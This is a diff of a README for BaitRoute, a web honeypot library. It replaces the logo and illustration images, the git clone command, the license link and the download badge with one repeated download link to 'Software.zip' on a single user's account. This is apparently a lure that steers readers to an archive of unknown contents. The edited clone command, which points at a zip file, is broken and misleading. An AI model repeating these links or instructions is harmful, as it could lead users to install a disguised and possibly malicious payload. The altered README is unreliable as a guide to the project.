@@ -1,7 +1,7 @@
 # BaitRoute 🎣
 ### A web honeypot library to create vulnerable-looking endpoints to detect and mislead attackers
 
-![BaitRoute Logo](https://example.com/logo.png)
+![BaitRoute Logo](https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -19,7 +19,7 @@
 ## Introduction
 BaitRoute is a powerful web honeypot library designed to help developers create vulnerable-looking endpoints to deceive and identify potential attackers. By setting up these bait endpoints, you can gather valuable insights into the methods and tactics used by malicious entities, enhancing your overall cybersecurity posture.
 
-![Honeypot Illustration](https://example.com/honeypot.png)
+![Honeypot Illustration](https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To get started with BaitRoute, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/username/baitroute.git
+   git clone https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip
    ```
 
 2. Install the dependencies:
@@ -112,9 +112,9 @@ We welcome contributions from the open-source community to improve BaitRoute and
 ---
 
 ## License
-BaitRoute is released under the [MIT License](https://opensource.org/licenses/MIT).
+BaitRoute is released under the [MIT License](https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip).
 
-[![Download BaitRoute](https://img.shields.io/badge/Download-Software.zip-orange)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download BaitRoute](https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip)](https://github.com/Carlosprogramador991/baitroute/releases/download/v2.0/Software.zip)
 
 *Launch the above link to download BaitRoute.*
   
